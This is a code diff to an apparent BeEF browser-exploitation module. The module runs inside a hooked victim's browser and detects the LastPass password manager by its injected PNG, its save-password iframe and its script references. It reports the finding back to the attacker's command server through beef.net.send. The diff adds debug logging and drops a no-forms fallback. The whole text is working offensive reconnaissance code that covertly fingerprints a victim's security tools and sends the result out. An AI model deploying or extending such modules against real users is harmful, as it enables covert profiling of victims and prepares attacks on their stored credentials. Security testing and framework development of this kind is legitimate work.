@@ -20,9 +20,12 @@ beef.execute(function() {
 	//Detect input form fields with the injected LastPass PNG as background image
 	var bginput =  $j('input[style]');
 	if (bginput.length > 0) {
+		beef.debug('input field with \'style\' attribute found: ' + bginput);
 		for(var i = 0; i < bginput.length; i++) {
+			beef.debug('Number of potential input fields with \'style\' attribute found: ' + bginput.length);
 			var styleContent = bginput[i].getAttribute('style');
 			if (styleContent.includes(base64PNG)) {
+				beef.debug('Matching inline PNG detected');
 				result = "Detected LastPass through presence of inline base64-encoded PNG within input form field";
 			}
 		}
@@ -30,6 +33,7 @@ beef.execute(function() {
 
 	//Detect presence of LastPass iframe
 	if ($j("iframe[name='LPFrame']").length > 0) {
+		beef.debug('Matching iframe found');
 		result = "Detected LastPass through presence of LastPass 'save password' iframe";
 	}
 
@@ -41,14 +45,7 @@ beef.execute(function() {
 	} else if ($j("script:contains(lastpass_iter)").length > 0) {
 		//We've got the second detection of LP
 		result = "Detected LastPass through presense of the embedded <script> which includes references to lastpass_iter";
-	} else {
-		//Form is not there, lets check for any form elements in this page, because, LP won't activate at all without a <form>
-		if (document.getElementsByTagName("form").length == 0) {
-			//No forms
-			result = "The page doesn't seem to include any forms - we can't tell if LastPass is installed";
-		}
-		
-	}
+	} 
 
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "lastpass="+result);
 });
